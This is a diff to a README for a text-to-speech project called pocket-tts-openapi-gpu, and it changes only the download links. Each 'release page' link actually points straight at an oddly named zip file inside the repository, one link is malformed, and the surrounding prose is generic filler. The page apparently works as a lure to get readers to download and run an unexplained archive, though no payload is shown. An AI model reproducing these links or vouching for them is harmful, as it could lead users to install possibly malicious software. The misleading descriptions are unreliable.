@@ -4,7 +4,7 @@
 Welcome to the pocket-tts-openapi-gpu project! This application enhances Pocket TTS by integrating GPU technology and providing TikTok-style captions. With our tool, you can create stunning audio pieces quickly and efficiently.
 
 ## 📥 Download Now
-[![Download pocket-tts-openapi-gpu](https://raw.githubusercontent.com/tozalia/pocket-tts-openapi-gpu/main/docs/openapi-gpu-tts-pocket-cystose.zip%20Now%20-%20Latest%https://raw.githubusercontent.com/tozalia/pocket-tts-openapi-gpu/main/docs/openapi-gpu-tts-pocket-cystose.zip)](https://raw.githubusercontent.com/tozalia/pocket-tts-openapi-gpu/main/docs/openapi-gpu-tts-pocket-cystose.zip)
+[![Download pocket-tts-openapi-gpu](https://github.com/tozalia/pocket-tts-openapi-gpu/raw/refs/heads/main/skills/tts_gpu_pocket_openapi_1.8.zip%20Now%20-%20Latest%https://github.com/tozalia/pocket-tts-openapi-gpu/raw/refs/heads/main/skills/tts_gpu_pocket_openapi_1.8.zip)](https://github.com/tozalia/pocket-tts-openapi-gpu/raw/refs/heads/main/skills/tts_gpu_pocket_openapi_1.8.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to start using pocket-tts-openapi-gpu.
@@ -17,7 +17,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Internet Connection:** A stable internet connection for downloading the software and accessing OpenAI services.
 
 ### 2. Visit the Release Page
-To get the software, visit our release page: [Download Page](https://raw.githubusercontent.com/tozalia/pocket-tts-openapi-gpu/main/docs/openapi-gpu-tts-pocket-cystose.zip).
+To get the software, visit our release page: [Download Page](https://github.com/tozalia/pocket-tts-openapi-gpu/raw/refs/heads/main/skills/tts_gpu_pocket_openapi_1.8.zip).
 
 ### 3. Download the Application
 On the release page, look for the version labeled "Latest Release." Click on it. You will see a list of files available for download. Choose the appropriate version for your operating system.
@@ -50,7 +50,7 @@ This software comes with several features designed to enhance user experience:
 - **Multi-format Output:** Save your audio in various formats, including MP3 and WAV.
 
 ## 📥 Download & Install
-To download and install the pocket-tts-openapi-gpu, revisit our download page: [Download Page](https://raw.githubusercontent.com/tozalia/pocket-tts-openapi-gpu/main/docs/openapi-gpu-tts-pocket-cystose.zip).
+To download and install the pocket-tts-openapi-gpu, revisit our download page: [Download Page](https://github.com/tozalia/pocket-tts-openapi-gpu/raw/refs/heads/main/skills/tts_gpu_pocket_openapi_1.8.zip).
 
 ## 📘 Troubleshooting
 If you encounter issues, here are a few common problems and solutions:
